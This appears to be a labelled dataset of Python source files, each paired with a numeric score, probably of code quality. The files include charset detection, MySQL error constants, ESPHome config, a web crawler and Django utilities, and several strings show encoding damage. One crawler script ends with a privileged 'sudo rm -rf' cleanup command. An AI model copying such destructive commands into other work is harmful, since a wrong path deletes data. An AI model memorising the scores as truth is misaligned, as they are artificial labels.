ÐºÐ¾Ð¼Ð°Ð½Ð´Ð½ÑÐ¹ Ð¿ÑÐ¾ÐµÐºÑ.')<<NEWL>>            continue<<NEWL>>        <<NEWL>>        try:<<NEWL>>            plan_uuid = mentors_api.create_weekly_plan(<<NEWL>>                order['uuid'],<<NEWL>>                project_task['uuid'],<<NEWL>>                project_task['execution_time']<<NEWL>>            )<<NEWL>>            mentors_api.create_gist(plan_uuid)<<NEWL>>            mentors_api.give_weekly_plan(<<NEWL>>                order['uuid'],<<NEWL>>                project_task['uuid'],<<NEWL>>                project_task['execution_time'],<<NEWL>>                plan_uuid<<NEWL>>            )<<NEWL>>            mentors_api.update_gist(plan_uuid)<<NEWL>>        except Exception as err:<<NEWL>>            print(f'Ð§ÑÐ¾-ÑÐ¾ Ð¿Ð¾ÑÐ»Ð¾ Ð½Ðµ ÑÐ°Ðº Ð² Ð·Ð°ÐºÐ°Ð·Ðµ: {order[""uuid""]}')<<NEWL>>        else:<<NEWL>>            for n in proj_notes:<<NEWL>>                mentors_api.close_note(n['uuid'])<<NEWL>><<NEWL>>            mentors_api.add_note(<<NEWL>>                student_uuid=order['student']['profile']['uuid'],<<NEWL>>                comment='$: ÐÐ°ÑÑÐ°Ð»Ð° Ð¿Ð¾ÑÐ° ÐºÐ¾Ð¼Ð°Ð½Ð´Ð½ÑÑ Ð¿ÑÐ¾ÐµÐºÑÐ¾Ð²! ÐÐ°Ðº Ð½Ð°ÑÑÑÐ¾Ð¹?)'<<NEWL>>            )<<NEWL>><<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    main()"
295	adjudicated	3	"from typing import Any, Dict, Optional, Union<<NEWL>>from warnings import warn<<NEWL>><<NEWL>>from .api import from_bytes<<NEWL>>from .constant import CHARDET_CORRESPONDENCE<<NEWL>><<NEWL>><<NEWL>>def detect(<<NEWL>>    byte_str: bytes, should_rename_legacy: bool = False, **kwargs: Any<<NEWL>>) -> Dict[str, Optional[Union[str, float]]]:<<NEWL>>    """"""<<NEWL>>    chardet legacy method<<NEWL>>    Detect the encoding of the given byte string. It should be mostly backward-compatible.<<NEWL>>    Encoding name will match Chardet own writing whenever possible. (Not on encoding name unsupported by it)<<NEWL>>    This function is deprecated and should be used to migrate your project easily, consult the documentation for<<NEWL>>    further information. Not planned for removal.<<NEWL>><<NEWL>>    :param byte_str:     The byte sequence to examine.<<NEWL>>    :param should_rename_legacy:  Should we rename legacy encodings<<NEWL>>                                  to their more modern equivalents?<<NEWL>>    """"""<<NEWL>>    if len(kwargs):<<NEWL>>        warn(<<NEWL>>            f""charset-normalizer disregard arguments '{','.join(list(kwargs.keys()))}' in legacy function detect()""<<NEWL>>        )<<NEWL>><<NEWL>>    if not isinstance(byte_str, (bytearray, bytes)):<<NEWL>>        raise TypeError(  # pragma: nocover<<NEWL>>            ""Expected object of type bytes or bytearray, got: ""<<NEWL>>            ""{0}"".format(type(byte_str))<<NEWL>>        )<<NEWL>><<NEWL>>    if isinstance(byte_str, bytearray):<<NEWL>>        byte_str = bytes(byte_str)<<NEWL>><<NEWL>>    r = from_bytes(byte_str).best()<<NEWL>><<NEWL>>    encoding = r.encoding if r is not None else None<<NEWL>>    language = r.language if r is not None and r.language != ""Unknown"" else """"<<NEWL>>    confidence = 1.0 - r.chaos if r is not None else None<<NEWL>><<NEWL>>    # Note: CharsetNormalizer does not return 'UTF-8-SIG' as the sig get stripped in the detection/normalization process<<NEWL>>    # but chardet does return 'utf-8-sig' and it is a valid codec name.<<NEWL>>    if r is not None and encoding == ""utf_8"" and r.bom:<<NEWL>>        encoding += ""_sig""<<NEWL>><<NEWL>>    if should_rename_legacy is False and encoding in CHARDET_CORRESPONDENCE:<<NEWL>>        encoding = CHARDET_CORRESPONDENCE[encoding]<<NEWL>><<NEWL>>    return {<<NEWL>>        ""encoding"": encoding,<<NEWL>>        ""language"": language,<<NEWL>>        ""confidence"": confidence,<<NEWL>>    }"
44	adjudicated	0	# flake8: noqa<<NEWL>># errmsg.h<<NEWL>>CR_ERROR_FIRST = 2000<<NEWL>>CR_UNKNOWN_ERROR = 2000<<NEWL>>CR_SOCKET_CREATE_ERROR = 2001<<NEWL>>CR_CONNECTION_ERROR = 2002<<NEWL>>CR_CONN_HOST_ERROR = 2003<<NEWL>>CR_IPSOCK_ERROR = 2004<<NEWL>>CR_UNKNOWN_HOST = 2005<<NEWL>>CR_SERVER_GONE_ERROR = 2006<<NEWL>>CR_VERSION_ERROR = 2007<<NEWL>>CR_OUT_OF_MEMORY = 2008<<NEWL>>CR_WRONG_HOST_INFO = 2009<<NEWL>>CR_LOCALHOST_CONNECTION = 2010<<NEWL>>CR_TCP_CONNECTION = 2011<<NEWL>>CR_SERVER_HANDSHAKE_ERR = 2012<<NEWL>>CR_SERVER_LOST = 2013<<NEWL>>CR_COMMANDS_OUT_OF_SYNC = 2014<<NEWL>>CR_NAMEDPIPE_CONNECTION = 2015<<NEWL>>CR_NAMEDPIPEWAIT_ERROR = 2016<<NEWL>>CR_NAMEDPIPEOPEN_ERROR = 2017<<NEWL>>CR_NAMEDPIPESETSTATE_ERROR = 2018<<NEWL>>CR_CANT_READ_CHARSET = 2019<<NEWL>>CR_NET_PACKET_TOO_LARGE = 2020<<NEWL>>CR_EMBEDDED_CONNECTION = 2021<<NEWL>>CR_PROBE_SLAVE_STATUS = 2022<<NEWL>>CR_PROBE_SLAVE_HOSTS = 2023<<NEWL>>CR_PROBE_SLAVE_CONNECT = 2024<<NEWL>>CR_PROBE_MASTER_CONNECT = 2025<<NEWL>>CR_SSL_CONNECTION_ERROR = 2026<<NEWL>>CR_MALFORMED_PACKET = 2027<<NEWL>>CR_WRONG_LICENSE = 2028<<NEWL>><<NEWL>>CR_NULL_POINTER = 2029<<NEWL>>CR_NO_PREPARE_STMT = 2030<<NEWL>>CR_PARAMS_NOT_BOUND = 2031<<NEWL>>CR_DATA_TRUNCATED = 2032<<NEWL>>CR_NO_PARAMETERS_EXISTS = 2033<<NEWL>>CR_INVALID_PARAMETER_NO = 2034<<NEWL>>CR_INVALID_BUFFER_USE = 2035<<NEWL>>CR_UNSUPPORTED_PARAM_TYPE = 2036<<NEWL>><<NEWL>>CR_SHARED_MEMORY_CONNECTION = 2037<<NEWL>>CR_SHARED_MEMORY_CONNECT_REQUEST_ERROR = 2038<<NEWL>>CR_SHARED_MEMORY_CONNECT_ANSWER_ERROR = 2039<<NEWL>>CR_SHARED_MEMORY_CONNECT_FILE_MAP_ERROR = 2040<<NEWL>>CR_SHARED_MEMORY_CONNECT_MAP_ERROR = 2041<<NEWL>>CR_SHARED_MEMORY_FILE_MAP_ERROR = 2042<<NEWL>>CR_SHARED_MEMORY_MAP_ERROR = 2043<<NEWL>>CR_SHARED_MEMORY_EVENT_ERROR = 2044<<NEWL>>CR_SHARED_MEMORY_CONNECT_ABANDONED_ERROR = 2045<<NEWL>>CR_SHARED_MEMORY_CONNECT_SET_ERROR = 2046<<NEWL>>CR_CONN_UNKNOW_PROTOCOL = 2047<<NEWL>>CR_INVALID_CONN_HANDLE = 2048<<NEWL>>CR_SECURE_AUTH = 2049<<NEWL>>CR_FETCH_CANCELED = 2050<<NEWL>>CR_NO_DATA = 2051<<NEWL>>CR_NO_STMT_METADATA = 2052<<NEWL>>CR_NO_RESULT_SET = 2053<<NEWL>>CR_NOT_IMPLEMENTED = 2054<<NEWL>>CR_SERVER_LOST_EXTENDED = 2055<<NEWL>>CR_STMT_CLOSED = 2056<<NEWL>>CR_NEW_STMT_METADATA = 2057<<NEWL>>CR_ALREADY_CONNECTED = 2058<<NEWL>>CR_AUTH_PLUGIN_CANNOT_LOAD = 2059<<NEWL>>CR_DUPLICATE_CONNECTION_ATTR = 2060<<NEWL>>CR_AUTH_PLUGIN_ERR = 2061<<NEWL>>CR_ERROR_LAST = 2061
155	adjudicated	2	"import json<<NEWL>>import requests<<NEWL>><<NEWL>><<NEWL>>class APIMng:<<NEWL>>    def __init__(self, melexID):<<NEWL>>        self.Melex_ID = melexID<<NEWL>>        self.Requests_endpoint = {<<NEWL>>            'url_recived': 'http://213.97.17.253:9000/requests/state/recived',<<NEWL>>            'url_put': 'http://213.97.17.253:9000/request',<<NEWL>>            'url_progress': 'http://213.97.17.253:9000/requests/state/progress',<<NEWL>>            'json': None,<<NEWL>>            'id': None<<NEWL>>        }<<NEWL>>        self.ParametersCCAA_endpoint = {<<NEWL>>            'url': 'http://213.97.17.253:9000/parametersCA/',<<NEWL>>            'json': None<<NEWL>>        }<<NEWL>>        self.estate = None<<NEWL>><<NEWL>>    def __del__(self):<<NEWL>>        pass<<NEWL>><<NEWL>>    # Pedir tareas REQUESTS/GET<<NEWL>>    def get_requests_api(self):<<NEWL>>        r = requests.get(url=self.Requests_endpoint['url_recived'])<<NEWL>>        self.Requests_endpoint['json'] = json.loads(r.text)<<NEWL>>        return self.Requests_endpoint['json']<<NEWL>><<NEWL>>    def task_progress(self):<<NEWL>>        r = requests.get(url=self.Requests_endpoint['url_progress'])<<NEWL>>        print(r.text)<<NEWL>>        if isinstance(json.loads(r.text), dict):<<NEWL>>            return None, False<<NEWL>>        else:<<NEWL>>            return json.loads(r.text), True<<NEWL>><<NEWL>>    # Mandar actualizaciÃ³n tareas (progreso o acabada) REQUESTS/PUT<<NEWL>>    def put_requests_api(self):<<NEWL>>        print(self.Requests_endpoint['url_put'] + '/' + str(self.Requests_endpoint['id']), self.Requests_endpoint['json'])<<NEWL>>        r = requests.put(self.Requests_endpoint['url_put'] + '/' + str(self.Requests_endpoint['id']), json=self.Requests_endpoint['json'])<<NEWL>>        print(r)<<NEWL>><<NEWL>>    # Mandar parÃ¡metros del vehÃ­culo (PARAMETERScar/PUT)<<NEWL>>    def put_ParametersCCAA_api(self):<<NEWL>>        r = requests.put(self.ParametersCCAA_endpoint['url'] + self.Melex_ID, json=self.ParametersCCAA_endpoint['json'])<<NEWL>><<NEWL>>    # Crear JSON para hacer el put al endpoint Requests<<NEWL>>    def requests_put_json(self, data, id):<<NEWL>>        self.Requests_endpoint[""json""] = data<<NEWL>>        self.Requests_endpoint[""id""] = id<<NEWL>><<NEWL>>    def create_ParametersCCAA_json(self, data):<<NEWL>>        self.ParametersCCAA_endpoint[""json""] = data<<NEWL>><<NEWL>>"
15	adjudicated	3	"import sys<<NEWL>><<NEWL>><<NEWL>>class VendorImporter:<<NEWL>>    """"""<<NEWL>>    A PEP 302 meta path importer for finding optionally-vendored<<NEWL>>    or otherwise naturally-installed packages from root_name.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):<<NEWL>>        self.root_name = root_name<<NEWL>>        self.vendored_names = set(vendored_names)<<NEWL>>        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')<<NEWL>><<NEWL>>    @property<<NEWL>>    def search_path(self):<<NEWL>>        """"""<<NEWL>>        Search first the vendor package then as a natural package.<<NEWL>>        """"""<<NEWL>>        yield self.vendor_pkg + '.'<<NEWL>>        yield ''<<NEWL>><<NEWL>>    def find_module(self, fullname, path=None):<<NEWL>>        """"""<<NEWL>>        Return self when fullname starts with root_name and the<<NEWL>>        target module is one vendored through this importer.<<NEWL>>        """"""<<NEWL>>        root, base, target = fullname.partition(self.root_name + '.')<<NEWL>>        if root:<<NEWL>>            return<<NEWL>>        if not any(map(target.startswith, self.vendored_names)):<<NEWL>>            return<<NEWL>>        return self<<NEWL>><<NEWL>>    def load_module(self, fullname):<<NEWL>>        """"""<<NEWL>>        Iterate over the search path to locate and load fullname.<<NEWL>>        """"""<<NEWL>>        root, base, target = fullname.partition(self.root_name + '.')<<NEWL>>        for prefix in self.search_path:<<NEWL>>            try:<<NEWL>>                extant = prefix + target<<NEWL>>                __import__(extant)<<NEWL>>                mod = sys.modules[extant]<<NEWL>>                sys.modules[fullname] = mod<<NEWL>>                return mod<<NEWL>>            except ImportError:<<NEWL>>                pass<<NEWL>>        else:<<NEWL>>            raise ImportError(<<NEWL>>                ""The '{target}' package is required; ""<<NEWL>>                ""normally this is bundled with this package so if you get ""<<NEWL>>                ""this warning, consult the packager of your ""<<NEWL>>                ""distribution."".format(**locals())<<NEWL>>            )<<NEWL>><<NEWL>>    def install(self):<<NEWL>>        """"""<<NEWL>>        Install this importer into sys.meta_path if not already present.<<NEWL>>        """"""<<NEWL>>        if self not in sys.meta_path:<<NEWL>>            sys.meta_path.append(self)<<NEWL>><<NEWL>><<NEWL>>names = 'packaging', 'pyparsing', 'six', 'appdirs'<<NEWL>>VendorImporter(__name__, names).install()"
384	adjudicated	0	"import esphome.codegen as cg<<NEWL>>import esphome.config_validation as cv<<NEWL>>from esphome import pins<<NEWL>>from esphome.components import display<<NEWL>>from esphome.const import (<<NEWL>>    CONF_BRIGHTNESS,<<NEWL>>    CONF_EXTERNAL_VCC,<<NEWL>>    CONF_LAMBDA,<<NEWL>>    CONF_MODEL,<<NEWL>>    CONF_RESET_PIN,<<NEWL>>)<<NEWL>><<NEWL>>CODEOWNERS = [""@kbx81""]<<NEWL>><<NEWL>>ssd1325_base_ns = cg.esphome_ns.namespace(""ssd1325_base"")<<NEWL>>SSD1325 = ssd1325_base_ns.class_(""SSD1325"", cg.PollingComponent, display.DisplayBuffer)<<NEWL>>SSD1325Model = ssd1325_base_ns.enum(""SSD1325Model"")<<NEWL>><<NEWL>>MODELS = {<<NEWL>>    ""SSD1325_128X32"": SSD1325Model.SSD1325_MODEL_128_32,<<NEWL>>    ""SSD1325_128X64"": SSD1325Model.SSD1325_MODEL_128_64,<<NEWL>>    ""SSD1325_96X16"": SSD1325Model.SSD1325_MODEL_96_16,<<NEWL>>    ""SSD1325_64X48"": SSD1325Model.SSD1325_MODEL_64_48,<<NEWL>>    ""SSD1327_128X128"": SSD1325Model.SSD1327_MODEL_128_128,<<NEWL>>}<<NEWL>><<NEWL>>SSD1325_MODEL = cv.enum(MODELS, upper=True, space=""_"")<<NEWL>><<NEWL>>SSD1325_SCHEMA = display.FULL_DISPLAY_SCHEMA.extend(<<NEWL>>    {<<NEWL>>        cv.Required(CONF_MODEL): SSD1325_MODEL,<<NEWL>>        cv.Optional(CONF_RESET_PIN): pins.gpio_output_pin_schema,<<NEWL>>        cv.Optional(CONF_BRIGHTNESS, default=1.0): cv.percentage,<<NEWL>>        cv.Optional(CONF_EXTERNAL_VCC): cv.boolean,<<NEWL>>    }<<NEWL>>).extend(cv.polling_component_schema(""1s""))<<NEWL>><<NEWL>><<NEWL>>async def setup_ssd1325(var, config):<<NEWL>>    await cg.register_component(var, config)<<NEWL>>    await display.register_display(var, config)<<NEWL>><<NEWL>>    cg.add(var.set_model(config[CONF_MODEL]))<<NEWL>>    if CONF_RESET_PIN in config:<<NEWL>>        reset = await cg.gpio_pin_expression(config[CONF_RESET_PIN])<<NEWL>>        cg.add(var.set_reset_pin(reset))<<NEWL>>    if CONF_BRIGHTNESS in config:<<NEWL>>        cg.add(var.init_brightness(config[CONF_BRIGHTNESS]))<<NEWL>>    if CONF_EXTERNAL_VCC in config:<<NEWL>>        cg.add(var.set_external_vcc(config[CONF_EXTERNAL_VCC]))<<NEWL>>    if CONF_LAMBDA in config:<<NEWL>>        lambda_ = await cg.process_lambda(<<NEWL>>            config[CONF_LAMBDA], [(display.DisplayBufferRef, ""it"")], return_type=cg.void<<NEWL>>        )<<NEWL>>        cg.add(var.set_writer(lambda_))"
83	adjudicated	3	"#!/usr/bin/env python<<NEWL>># Copyright 2021 Google, Inc<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>># All Rights Reserved.<<NEWL>><<NEWL>># [START recaptcha_enterprise_get_site_key]<<NEWL>>from google.cloud import recaptchaenterprise_v1<<NEWL>><<NEWL>><<NEWL>>def get_site_key(project_id: str, recaptcha_site_key: str) -> None:<<NEWL>>    """"""<<NEWL>>    Get the reCAPTCHA site key present under the project ID.<<NEWL>><<NEWL>>    Args:<<NEWL>>    project_id: GCloud Project ID.<<NEWL>>    recaptcha_site_key: Specify the site key to get the details.<<NEWL>>    """"""<<NEWL>><<NEWL>>    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()<<NEWL>><<NEWL>>    # Construct the key details.<<NEWL>>    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""<<NEWL>><<NEWL>>    request = recaptchaenterprise_v1.GetKeyRequest()<<NEWL>>    request.name = key_name<<NEWL>><<NEWL>>    key = client.get_key(request)<<NEWL>>    print(""Successfully obtained the key !"" + key.name)<<NEWL>><<NEWL>><<NEWL>># [END recaptcha_enterprise_get_site_key]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import google.auth<<NEWL>>    import google.auth.exceptions<<NEWL>><<NEWL>>    # TODO(developer): Replace the below variables before running<<NEWL>>    try:<<NEWL>>        default_project_id = google.auth.default()[1]<<NEWL>>        recaptcha_site_key = ""recaptcha_site_key""<<NEWL>>    except google.auth.exceptions.DefaultCredentialsError:<<NEWL>>        print(<<NEWL>>            ""Please use `gcloud auth application-default login` ""<<NEWL>>            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""<<NEWL>>        )<<NEWL>>    else:<<NEWL>>        get_site_key(default_project_id, recaptcha_site_key)"
312	adjudicated	4	"#!../env.py<<NEWL>>#<<NEWL>># SPDX-License-Identifier: BSD-3-Clause<<NEWL>># Copyright 2020, Intel Corporation<<NEWL>><<NEWL>>import testframework as t<<NEWL>>from testframework import granularity as g<<NEWL>>import futils<<NEWL>>import os<<NEWL>><<NEWL>><<NEWL>># All test cases in pmem2_persist_valgrind use Valgrind, which is not available<<NEWL>># on Windows systems.<<NEWL>>@t.windows_exclude<<NEWL>>@t.require_valgrind_enabled('pmemcheck')<<NEWL>># XXX In the match file, there are two possible numbers of errors. It varies<<NEWL>># from compiler to compiler. There should be only one number when pmemcheck<<NEWL>># will be fixed. Please also remove the below requirement after pmemcheck fix.<<NEWL>># https://github.com/pmem/valgrind/pull/76<<NEWL>>@g.require_granularity(g.CL_OR_LESS)<<NEWL>>class PMEM2_PERSIST(t.Test):<<NEWL>>    test_type = t.Medium<<NEWL>>    available_granularity = None<<NEWL>><<NEWL>>    def run(self, ctx):<<NEWL>>        filepath = ctx.create_holey_file(2 * t.MiB, 'testfile')<<NEWL>>        ctx.exec('pmem2_persist_valgrind', self.test_case, filepath)<<NEWL>><<NEWL>><<NEWL>>class TEST0(PMEM2_PERSIST):<<NEWL>>    """"""persist continuous data in a range of pmem""""""<<NEWL>>    test_case = ""test_persist_continuous_range""<<NEWL>><<NEWL>><<NEWL>>class TEST1(PMEM2_PERSIST):<<NEWL>>    """"""persist discontinuous data in a range of pmem""""""<<NEWL>>    test_case = ""test_persist_discontinuous_range""<<NEWL>><<NEWL>><<NEWL>>class TEST2(PMEM2_PERSIST):<<NEWL>>    """"""persist part of discontinuous data in a range of pmem""""""<<NEWL>>    test_case = ""test_persist_discontinuous_range_partially""<<NEWL>><<NEWL>>    def run(self, ctx):<<NEWL>>        filepath = ctx.create_holey_file(16 * t.KiB, 'testfile')<<NEWL>>        ctx.exec('pmem2_persist_valgrind', self.test_case, filepath)<<NEWL>>        pmemecheck_log = os.path.join(<<NEWL>>            os.getcwd(), 'pmem2_persist_valgrind', 'pmemcheck2.log')<<NEWL>>        futils.tail(pmemecheck_log, 2)<<NEWL>><<NEWL>><<NEWL>>class TEST3(PMEM2_PERSIST):<<NEWL>>    """"""persist data in a range of the memory mapped by mmap()""""""<<NEWL>>    test_case = ""test_persist_nonpmem_data"""
252	adjudicated	0	"import datetime, json, os, sys<<NEWL>>from lib.crawling import Crawling<<NEWL>>from lib.database import DB<<NEWL>>from lib.telegram import TeleGram<<NEWL>>from lib.make_data import Make_Data<<NEWL>>from lib.settings import logger, make_folder, args_check, json_check, now, photo_path<<NEWL>><<NEWL>>def run(hscode_dict, crawling, db, tele, make):<<NEWL>>    menus = ''<<NEWL>>    menus += '#ìì¶ìë°ì´í° ' + now.strftime('#%Yë%mì%dì¼') + '\n'<<NEWL>><<NEWL>>    for title in hscode_dict:<<NEWL>>        tag = '#ìì¶ìë°ì´í°' + ' ' + '#' + title + ' ' + now.strftime('#%Yë%mì%dì¼')    <<NEWL>>        photo_name = photo_path + str(hscode_dict[title]) + '_' + str(now.year) + str(now.month) + str(now.day) + '.png'<<NEWL>>        crawling_dict = crawling.get_search(hscode_dict[title])<<NEWL>>        df, template, month = make.data_remodel(crawling_dict, hscode_dict[title], tag, db)<<NEWL>>        make.make_photo(df, title, hscode_dict[title], photo_name, month)<<NEWL>>        tele.send_photo(photo_name, template)<<NEWL>>        db.insert_update_db(title, hscode_dict[title], crawling_dict)<<NEWL>>        menus += '#' + title + '\n'<<NEWL>>    tele.send_message(menus)<<NEWL>><<NEWL>>def main():<<NEWL>>    crawling = Crawling()<<NEWL>>    db = DB()<<NEWL>>    tele = TeleGram()<<NEWL>>    make = Make_Data()<<NEWL>><<NEWL>>    for json_file in json_list:<<NEWL>>        with open(json_path + json_file, 'r', encoding='utf-8') as f:<<NEWL>>            hscode_dict = json.load(f)<<NEWL>>        run(hscode_dict, crawling, db, tele, make)<<NEWL>>        f.close()    <<NEWL>><<NEWL>>    db.cs.close()<<NEWL>>    crawling.driver.close()<<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    args = sys.argv<<NEWL>>    json_path = args_check(args)<<NEWL>>    json_list = json_check(json_path)<<NEWL>><<NEWL>>    logger(f""Main started at {now}"")<<NEWL>>    make_folder()<<NEWL>>    main()<<NEWL>>    et = datetime.datetime.now()<<NEWL>>    logger(f""Main finished at {et}"")<<NEWL>>    logger(f""Main time for task: {et-now}"")<<NEWL>>    os.system(""sudo rm -rf {photo_path}*.png"".format(photo_path=photo_path))"
343	adjudicated	4	"""""""<<NEWL>>PostGIS to GDAL conversion constant definitions<<NEWL>>""""""<<NEWL>># Lookup to convert pixel type values from GDAL to PostGIS<<NEWL>>GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]<<NEWL>><<NEWL>># Lookup to convert pixel type values from PostGIS to GDAL<<NEWL>>POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]<<NEWL>><<NEWL>># Struct pack structure for raster header, the raster header has the<<NEWL>># following structure:<<NEWL>>#<<NEWL>># Endianness, PostGIS raster version, number of bands, scale, origin,<<NEWL>># skew, srid, width, and height.<<NEWL>>#<<NEWL>># Scale, origin, and skew have x and y values. PostGIS currently uses<<NEWL>># a fixed endianness (1) and there is only one version (0).<<NEWL>>POSTGIS_HEADER_STRUCTURE = 'B H H d d d d d d i H H'<<NEWL>><<NEWL>># Lookup values to convert GDAL pixel types to struct characters. This is<<NEWL>># used to pack and unpack the pixel values of PostGIS raster bands.<<NEWL>>GDAL_TO_STRUCT = [<<NEWL>>    None, 'B', 'H', 'h', 'L', 'l', 'f', 'd',<<NEWL>>    None, None, None, None,<<NEWL>>]<<NEWL>><<NEWL>># Size of the packed value in bytes for different numerical types.<<NEWL>># This is needed to cut chunks of band data out of PostGIS raster strings<<NEWL>># when decomposing them into GDALRasters.<<NEWL>># See https://docs.python.org/library/struct.html#format-characters<<NEWL>>STRUCT_SIZE = {<<NEWL>>    'b': 1,  # Signed char<<NEWL>>    'B': 1,  # Unsigned char<<NEWL>>    '?': 1,  # _Bool<<NEWL>>    'h': 2,  # Short<<NEWL>>    'H': 2,  # Unsigned short<<NEWL>>    'i': 4,  # Integer<<NEWL>>    'I': 4,  # Unsigned Integer<<NEWL>>    'l': 4,  # Long<<NEWL>>    'L': 4,  # Unsigned Long<<NEWL>>    'f': 4,  # Float<<NEWL>>    'd': 8,  # Double<<NEWL>>}<<NEWL>><<NEWL>># Pixel type specifies type of pixel values in a band. Storage flag specifies<<NEWL>># whether the band data is stored as part of the datum or is to be found on the<<NEWL>># server's filesystem. There are currently 11 supported pixel value types, so 4<<NEWL>># bits are enough to account for all. Reserve the upper 4 bits for generic<<NEWL>># flags.<<NEWL>># See https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag<<NEWL>>BANDTYPE_PIXTYPE_MASK = 0x0F<<NEWL>>BANDTYPE_FLAG_HASNODATA = 1 << 6"
192	adjudicated	1	"import functools<<NEWL>>from typing import Callable, Generator, Iterable, Iterator, Optional, Tuple<<NEWL>><<NEWL>>from pip._vendor.rich.progress import (<<NEWL>>    BarColumn,<<NEWL>>    DownloadColumn,<<NEWL>>    FileSizeColumn,<<NEWL>>    Progress,<<NEWL>>    ProgressColumn,<<NEWL>>    SpinnerColumn,<<NEWL>>    TextColumn,<<NEWL>>    TimeElapsedColumn,<<NEWL>>    TimeRemainingColumn,<<NEWL>>    TransferSpeedColumn,<<NEWL>>)<<NEWL>><<NEWL>>from pip._internal.utils.logging import get_indentation<<NEWL>><<NEWL>>DownloadProgressRenderer = Callable[[Iterable[bytes]], Iterator[bytes]]<<NEWL>><<NEWL>><<NEWL>>def _rich_progress_bar(<<NEWL>>    iterable: Iterable[bytes],<<NEWL>>    *,<<NEWL>>    bar_type: str,<<NEWL>>    size: int,<<NEWL>>) -> Generator[bytes, None, None]:<<NEWL>>    assert bar_type == ""on"", ""This should only be used in the default mode.""<<NEWL>><<NEWL>>    if not size:<<NEWL>>        total = float(""inf"")<<NEWL>>        columns: Tuple[ProgressColumn, ...] = (<<NEWL>>            TextColumn(""[progress.description]{task.description}""),<<NEWL>>            SpinnerColumn(""line"", speed=1.5),<<NEWL>>            FileSizeColumn(),<<NEWL>>            TransferSpeedColumn(),<<NEWL>>            TimeElapsedColumn(),<<NEWL>>        )<<NEWL>>    else:<<NEWL>>        total = size<<NEWL>>        columns = (<<NEWL>>            TextColumn(""[progress.description]{task.description}""),<<NEWL>>            BarColumn(),<<NEWL>>            DownloadColumn(),<<NEWL>>            TransferSpeedColumn(),<<NEWL>>            TextColumn(""eta""),<<NEWL>>            TimeRemainingColumn(),<<NEWL>>        )<<NEWL>><<NEWL>>    progress = Progress(*columns, refresh_per_second=30)<<NEWL>>    task_id = progress.add_task("" "" * (get_indentation() + 2), total=total)<<NEWL>>    with progress:<<NEWL>>        for chunk in iterable:<<NEWL>>            yield chunk<<NEWL>>            progress.update(task_id, advance=len(chunk))<<NEWL>><<NEWL>><<NEWL>>def get_download_progress_renderer(<<NEWL>>    *, bar_type: str, size: Optional[int] = None<<NEWL>>) -> DownloadProgressRenderer:<<NEWL>>    """"""Get an object that can be used to render the download progress.<<NEWL>><<NEWL>>    Returns a callable, that takes an iterable to ""wrap"".<<NEWL>>    """"""<<NEWL>>    if bar_type == ""on"":<<NEWL>>        return functools.partial(_rich_progress_bar, bar_type=bar_type, size=size)<<NEWL>>    else:<<NEWL>>        return iter  # no-op, when passed an iterator"
203	adjudicated	3	"from importlib import import_module<<NEWL>><<NEWL>>from django.utils.version import get_docs_version<<NEWL>><<NEWL>><<NEWL>>def deconstructible(*args, path=None):<<NEWL>>    """"""<<NEWL>>    Class decorator that allows the decorated class to be serialized<<NEWL>>    by the migrations subsystem.<<NEWL>><<NEWL>>    The `path` kwarg specifies the import path.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def decorator(klass):<<NEWL>>        def __new__(cls, *args, **kwargs):<<NEWL>>            # We capture the arguments to make returning them trivial<<NEWL>>            obj = super(klass, cls).__new__(cls)<<NEWL>>            obj._constructor_args = (args, kwargs)<<NEWL>>            return obj<<NEWL>><<NEWL>>        def deconstruct(obj):<<NEWL>>            """"""<<NEWL>>            Return a 3-tuple of class import path, positional arguments,<<NEWL>>            and keyword arguments.<<NEWL>>            """"""<<NEWL>>            # Fallback version<<NEWL>>            if path and type(obj) is klass:<<NEWL>>                module_name, _, name = path.rpartition(""."")<<NEWL>>            else:<<NEWL>>                module_name = obj.__module__<<NEWL>>                name = obj.__class__.__name__<<NEWL>>            # Make sure it's actually there and not an inner class<<NEWL>>            module = import_module(module_name)<<NEWL>>            if not hasattr(module, name):<<NEWL>>                raise ValueError(<<NEWL>>                    ""Could not find object %s in %s.\n""<<NEWL>>                    ""Please note that you cannot serialize things like inner ""<<NEWL>>                    ""classes. Please move the object into the main module ""<<NEWL>>                    ""body to use migrations.\n""<<NEWL>>                    ""For more information, see ""<<NEWL>>                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""<<NEWL>>                    ""#serializing-values"" % (name, module_name, get_docs_version())<<NEWL>>                )<<NEWL>>            return (<<NEWL>>                path<<NEWL>>                if path and type(obj) is klass<<NEWL>>                else f""{obj.__class__.__module__}.{name}"",<<NEWL>>                obj._constructor_args[0],<<NEWL>>                obj._constructor_args[1],<<NEWL>>            )<<NEWL>><<NEWL>>        klass.__new__ = staticmethod(__new__)<<NEWL>>        klass.deconstruct = deconstruct<<NEWL>><<NEWL>>        return klass<<NEWL>><<NEWL>>    if not args:<<NEWL>>        return decorator<<NEWL>>    return decorator(*args)"
